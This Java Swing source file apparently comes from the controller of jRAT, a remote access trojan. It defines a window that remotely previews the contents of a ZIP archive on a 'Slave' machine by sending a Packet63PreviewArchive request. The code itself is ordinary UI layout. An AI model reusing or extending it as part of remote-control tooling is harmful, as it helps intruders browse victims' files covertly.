package jrat.controller.ui.frames;

import iconlib.IconUtils;
import jrat.controller.Slave;
import jrat.controller.packets.outgoing.Packet63PreviewArchive;
import jrat.controller.ui.DefaultJTable;
import jrat.controller.ui.components.TableModel;

import javax.swing.*;
import javax.swing.GroupLayout.Alignment;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.border.EmptyBorder;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;


@SuppressWarnings("serial")
public class FramePreviewZip extends BaseFrame {

	public static Map<Slave, FramePreviewZip> INSTANCES = new HashMap<Slave, FramePreviewZip>();

	private JPanel contentPane;
	private JTable table;
	private TableModel model;
	private String file;

	public TableModel getModel() {
		return model;
	}

	public FramePreviewZip(Slave s, String f) {
		super(s);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		this.file = f;
		INSTANCES.put(slave, this);
		setIconImage(Toolkit.getDefaultToolkit().getImage(FramePreviewZip.class.getResource("/icons/archive.png")));
		setTitle("ZIP Preview - " + f);
		setDefaultCloseOperation(DISPOSE_ON_CLOSE);
		setBounds(100, 100, 445, 315);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		JButton btnReload = new JButton("Reload");
		btnReload.setIcon(IconUtils.getIcon("update"));
		btnReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				clear();
				reload();
			}
		});

		JButton btnClear = new JButton("Clear");
		btnClear.setIcon(IconUtils.getIcon("clear"));
		btnClear.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				clear();
			}
		});

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);

		table = new DefaultJTable() {
			@SuppressWarnings({ "unchecked", "rawtypes" })
			@Override
			public Class getColumnClass(int column) {
				if (column == 0) {
					return Icon.class;
				}
				return super.getColumnClass(column);
			}
		};
		table.setModel(model = new TableModel(new Object[][] {}, new String[] { " ", "File name", "Size" }) {
			public boolean isCellEditable(int row, int column) {
				return false;
			}
		});
		table.getColumnModel().getColumn(0).setPreferredWidth(30);
		table.getColumnModel().getColumn(1).setPreferredWidth(273);
		table.getColumnModel().getColumn(2).setPreferredWidth(104);
		table.setRowHeight(30);
		scrollPane.setViewportView(table);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 423, Short.MAX_VALUE).addGroup(gl_contentPane.createSequentialGroup().addGap(8).addComponent(btnReload).addPreferredGap(ComponentPlacement.RELATED).addComponent(btnClear)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.DEFAULT_SIZE, 234, Short.MAX_VALUE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnClear)).addGap(5)));
		contentPane.setLayout(gl_contentPane);
		reload();
	}

	public void clear() {
		while (model.getRowCount() > 0) {
			model.removeRow(0);
		}
	}

	public void reload() {
		slave.addToSendQueue(new Packet63PreviewArchive(file));
	}

	public void exit() {
		INSTANCES.remove(slave);
	}
}
